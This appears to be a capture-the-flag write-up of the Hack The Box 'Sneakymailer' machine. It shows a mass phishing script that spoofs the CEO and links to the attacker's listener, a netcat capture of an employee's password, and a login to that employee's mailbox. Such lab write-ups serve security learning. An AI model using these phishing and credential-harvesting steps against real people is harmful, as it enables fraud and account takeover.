<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup." /><meta property="og:title" content="Hackthebox Sneakymailer writeup" /><meta property="og:description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/sneakymailer/sneakymailer.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Sneakymailer writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="This machine is currently active on hackthebox wait until it gets retired or if you have owned it then you need to get the Administrator NTLM hash or the root password hash from the file /etc/shadow file.And enjoy the writeup."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/sneakymailer/sneakymailer.png"><title>Hackthebox Sneakymailer writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Sneakymailer writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Sneakymailer writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 15, 2020, 12:00 AM +0800" > Jul 15 <i class="unloaded">2020-07-15T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/sneakymailer.png" class="post-preview-img"><h1 id="introductionsneakymailer">Introduction@sneakymailer:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Sneakymailer<tr><td>IP<td>10.10.10.197<tr><td>Points<td>30<tr><td>Os<td>Linux<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/106709" target="_blank">Sulcud</a><tr><td>Out On<td>11 July 2020</table></div><h1 id="briefsneakymailer">Brief@Sneakymailer:~$</h1><p>Nmap exposing a new <code class="language-plaintext highlighter-rouge">domain</code> , Grabbing <code class="language-plaintext highlighter-rouge">employees</code> <strong>emails</strong> from a webpage . Using <code class="language-plaintext highlighter-rouge">swaks</code> to send <strong>Spoofed</strong> email to all the 57 <strong>emails</strong> to <code class="language-plaintext highlighter-rouge">phish</code> an employee . Got a Username and password , Login into the <code class="language-plaintext highlighter-rouge">imap</code> and reading some <strong>messages</strong> and got another <code class="language-plaintext highlighter-rouge">credentials</code> , Using them to login to <strong>ftp</strong> , The <strong>Dir</strong> which is being <strong>shared</strong> on ftp is a new <code class="language-plaintext highlighter-rouge">subdomain</code> itself . On Ftp we have rights to write into <strong>Ftp</strong> dir so uploading a <code class="language-plaintext highlighter-rouge">shell</code> and <strong>executing</strong> it on website. Got a hash from <code class="language-plaintext highlighter-rouge">.htpasswd</code> file, cracking it and <strong>building</strong> a package and <code class="language-plaintext highlighter-rouge">Exploiting</code> the <strong>Pypi</strong> server to get shell as <code class="language-plaintext highlighter-rouge">low</code> and the user <strong>low</strong> can run <code class="language-plaintext highlighter-rouge">pip3</code> as root . <strong>Abusing</strong> <code class="language-plaintext highlighter-rouge">pip3</code> and got shell as root</p><h1 id="summary">Summary:</h1><ul><li><code class="language-plaintext highlighter-rouge">Nmap</code> revealed a new <strong>domain</strong><li>Got a list of employees and their <strong>emails</strong><li>Stroing all 57 <code class="language-plaintext highlighter-rouge">emails</code> to a file<li>Using <strong>Swaks</strong> to send a spoofed email from <strong>CEO</strong><li>Making a python <strong><code class="language-plaintext highlighter-rouge">script</code></strong> to send spoofed email to all <code class="language-plaintext highlighter-rouge">employees</code><li><strong>Phishing</strong> the employees<li>Got a response from <code class="language-plaintext highlighter-rouge">paulbyrd</code> containing his <code class="language-plaintext highlighter-rouge">password</code> and email<li>Using that <strong>password</strong> on the <strong>imap</strong> and reading his mails<li>Got credentials that worked on <code class="language-plaintext highlighter-rouge">ftp</code><li>Uploading <strong>PHP</strong> shell to <strong>ftp</strong> and accessing it on website with a new subdomain<li>Got an initial shell as <code class="language-plaintext highlighter-rouge">www-data</code><li>Got a <strong>hash</strong> from <strong>.htpasswd</strong> file of pypi server<li>Cracking it via <code class="language-plaintext highlighter-rouge">john</code><li>Building a <strong>pypi</strong> package and embeding our <strong>payload</strong> in it<li>Abusing <code class="language-plaintext highlighter-rouge">pypi</code> to get shell as <code class="language-plaintext highlighter-rouge">low</code> using netcat<li>Abusing <code class="language-plaintext highlighter-rouge">pypi</code> to get ssh shell as <code class="language-plaintext highlighter-rouge">low</code> by writing public key<li>Got <strong>user.txt</strong><li>Low can run <strong>pip3</strong> as root without password<li>Following <code class="language-plaintext highlighter-rouge">gtfobins</code> and exploiting <code class="language-plaintext highlighter-rouge">pip3</code><li>Got <strong>root.txt</strong></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/sneakymailer/sneakymailer.cast" start-at="0" autoplay="1.5" speed="2" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre>➜  sneakymailer nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.197
<span class="c"># Nmap 7.80 scan initiated Tue Jul 14 00:41:59 2020 as: nmap -sV -sC -oA scans/nmap.full -p- -T4 -v 10.10.10.197</span>
Nmap scan report <span class="k">for </span>sneakymailer.htb <span class="o">(</span>10.10.10.197<span class="o">)</span>
Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
|_imap-capabilities: CHILDREN STARTTLS IDLE IMAP4rev1 <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT CAPABILITY ENABLE <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 completed OK NAMESPACE <span class="nv">ACL2</span><span class="o">=</span>UNION ACL <span class="nv">THREAD</span><span class="o">=</span>REFERENCES QUOTA UIDPLUS SORT
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>8080/tcp open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Jul 14 00:58:15 2020 -- 1 IP address (1 host up) scanned in 976.22 seconds</span>
</pre></table></code></div></div><p>Okay…So many ports are opened but some ports are revealing why the <strong>creator</strong> named this box <code class="language-plaintext highlighter-rouge">sneakymailer</code></p><p>The port 80 is being redirected to the <strong>http://sneakycorp.htb</strong> so i added the <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> to the <strong>/etc/hosts</strong> file</p><h2 id="port---80">Port - 80</h2><p>Lets look around on the port 80</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-1.png" alt="port-80" /></p><p>OKay..its a pypi server</p><p>There is one more file called <code class="language-plaintext highlighter-rouge">team.php</code></p><blockquote><p>team.php</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-2.png" alt="port-80 team.php" /></p><p>I got some juicy information here i.e. some emails of <code class="language-plaintext highlighter-rouge">employees</code> even of the <code class="language-plaintext highlighter-rouge">ceo</code></p><h2 id="extracting-emails">Extracting emails</h2><p>I extracted all the emails from the webpage using the <strong>online email extractor tool</strong></p><blockquote><p><a href="https://email-checker.net/extract" target="_blank">https://email-checker.net/extract</a></p></blockquote><p>Pressed <code class="language-plaintext highlighter-rouge">ctrl+a</code> to select all the data on the <strong>team.php</strong> and pasted it in .</p><blockquote><p><code class="language-plaintext highlighter-rouge">ctrl+a</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-3.png" alt="team.php" /></p><blockquote><p>pasted in</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-4.png" alt="email-extractor" /></p><blockquote><p>Got the emails</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/sneakymailer/07680b65-a21a-436c-b959-a9b35278f992/image-5.png" alt="email-extractor" /></p><p>And save all the emails in a file called <code class="language-plaintext highlighter-rouge">emails</code></p><h1 id="sending-spoofed-email">Sending spoofed email</h1><p>Now since i know that <code class="language-plaintext highlighter-rouge">SMTP</code> and various mail ports are opened , i can try to send messages to the employees and maybe i would be able to phish anyone</p><p>I will be using a tool called <code class="language-plaintext highlighter-rouge">swaks</code> to send spoofed emails from the <code class="language-plaintext highlighter-rouge">ceo</code> itself</p><blockquote><p><a href="https://github.com/jetmore/swaks" target="_blank">https://github.com/jetmore/swaks</a></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>➜  sneakymailer swaks <span class="nt">--from</span> <span class="s2">"angelicaramos@sneakymailer.htb"</span> <span class="nt">--body</span> <span class="s2">"Test msg"</span> <span class="nt">--to</span> angelicaramos@sneakymailer.htb
<span class="o">===</span> Trying sneakymailer.htb:25...
<span class="o">===</span> Connected to sneakymailer.htb.
&lt;-  220 debian ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
 -&gt; EHLO 0xPrashant
&lt;-  250-debian
&lt;-  250-PIPELINING
&lt;-  250-SIZE 10240000
&lt;-  250-VRFY
&lt;-  250-ETRN
&lt;-  250-STARTTLS
&lt;-  250-ENHANCEDSTATUSCODES
&lt;-  250-8BITMIME
&lt;-  250-DSN
&lt;-  250-SMTPUTF8
&lt;-  250 CHUNKING
 -&gt; MAIL FROM:&lt;angelicaramos@sneakymailer.htb&gt;
&lt;-  250 2.1.0 Ok
 -&gt; RCPT TO:&lt;angelicaramos@sneakymailer.htb&gt;
&lt;-  250 2.1.5 Ok
 -&gt; DATA
&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -&gt; Date: Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
 -&gt; To: angelicaramos@sneakymailer.htb
 -&gt; From: angelicaramos@sneakymailer.htb
 -&gt; Subject: <span class="nb">test </span>Wed, 15 Jul 2020 22:56:30 <span class="nt">-0400</span>
 -&gt; Message-Id: &lt;20200715225630.013546@0xPrashant&gt;
 -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -&gt; 
 -&gt; Test msg
 -&gt; 
 -&gt; 
 -&gt; <span class="nb">.</span>
&lt;-  250 2.0.0 Ok: queued as F3049248C8
 -&gt; QUIT
&lt;-  221 2.0.0 Bye
<span class="o">===</span> Connection closed with remote host.
</pre></table></code></div></div><p>Here i specified</p><ul><li><strong>–body “``my msg`“</strong><li><strong>–from “<code class="language-plaintext highlighter-rouge">spoofed email</code>“</strong><li><strong>–to “<code class="language-plaintext highlighter-rouge">Whom i sending</code>“</strong></ul><p>And the email is sent , Cool</p><h2 id="phishing-the-employee">Phishing the employee</h2><p>Now i made a script that will send email to every <strong>email address</strong> that i have in my <code class="language-plaintext highlighter-rouge">emails</code> file , thus if any user click on the link i wil send it will be show response on my <code class="language-plaintext highlighter-rouge">netcat</code> <strong>listener</strong></p><blockquote><p>spoofed-email.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="k">def</span> <span class="nf">open_ressources</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
<span class="n">wordlist</span> <span class="o">=</span> <span class="n">open_ressources</span><span class="p">(</span><span class="s">"emails"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">emails</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[+]Sending email to "</span> <span class="o">+</span> <span class="n">emails</span>
        <span class="n">command</span> <span class="o">=</span> <span class="s">'swaks --from "angelicaramos@sneakymailer.htb" --body "http://10.10.14.24:8080" --to '</span> <span class="o">+</span> <span class="n">emails</span> <span class="o">+</span> <span class="s">" &gt; /dev/null"</span>
        <span class="c1">#print command
</span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
</pre></table></code></div></div><p>And i will be listening on the port <code class="language-plaintext highlighter-rouge">8080</code> on my machine , to get any response from the clicked link</p><blockquote><p>Running the script</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>➜  sneakymailer python spoof-msg.py                                                    

<span class="o">[</span>+]Sending email to airisatou@sneakymailer.htb

<span class="o">[</span>+]Sending email to angelicaramos@sneakymailer.htb

<span class="o">[</span>+]Sending email to ashtoncox@sneakymailer.htb

<span class="o">[</span>+]Sending email to bradleygreer@sneakymailer.htb
</pre></table></code></div></div><blockquote><p>Got response on listener</p></blockquote><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="err">➜  prashant nc -nlvp 8080 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:48426.
</span><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.24:8080</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.23.0</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">185</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>

firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</pre></table></code></div></div><p>So <code class="language-plaintext highlighter-rouge">paulbyrd</code> clicked on the link and we got a response back</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">firstName</span><span class="o">=</span>Paul&amp;lastName<span class="o">=</span>Byrd&amp;email<span class="o">=</span>paulbyrd%40sneakymailer.htb&amp;password<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword<span class="o">=</span>%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</pre></table></code></div></div><p>Decoding <code class="language-plaintext highlighter-rouge">password</code> as url</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  prashant urlencode <span class="nt">-d</span> <span class="s2">"%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt"</span>                                                              
^<span class="o">(</span><span class="c">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span>
</pre></table></code></div></div><p>And the final thing that i could conclude is username : <strong><code class="language-plaintext highlighter-rouge">paulbyrd</code></strong> and password : <strong>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</strong></p><p>I tried to login myself on <code class="language-plaintext highlighter-rouge">ssh</code> and <code class="language-plaintext highlighter-rouge">ftp</code> port but it didnt work on both</p><p>Then i tried to login myself on <strong>imap</strong> on port <code class="language-plaintext highlighter-rouge">993</code> using the same creds</p><blockquote><p>connecting</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  prashant openssl s_client <span class="nt">-crlf</span> <span class="nt">-connect</span> 10.10.10.197:993
</pre></table></code></div></div><blockquote><p>login</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>a login paulbyrd ^<span class="o">(</span><span class="c">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span>
<span class="k">*</span> OK <span class="o">[</span>ALERT] Filesystem notification initialization error <span class="nt">--</span> contact your mail administrator <span class="o">(</span>check <span class="k">for </span>configuration errors with the FAM/Gamin library<span class="o">)</span>
a OK LOGIN Ok.
</pre></table></code></div></div><p>and i am logged in as <strong>paulbyrd</strong></p><blockquote><p>listing mailbox</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>a list <span class="s2">""</span> <span class="k">*</span>
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\U</span>nmarked <span class="se">\H</span>asChildren<span class="o">)</span> <span class="s2">"."</span> <span class="s2">"INBOX"</span>
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> <span class="s2">"INBOX.Trash"</span>
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> <span class="s2">"INBOX.Sent"</span>
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> <span class="s2">"INBOX.Deleted Items"</span>
<span class="k">*</span> LIST <span class="o">(</span><span class="se">\H</span>asNoChildren<span class="o">)</span> <span class="s2">"."</span> <span class="s2">"INBOX.Sent Items"</span>
a OK LIST completed
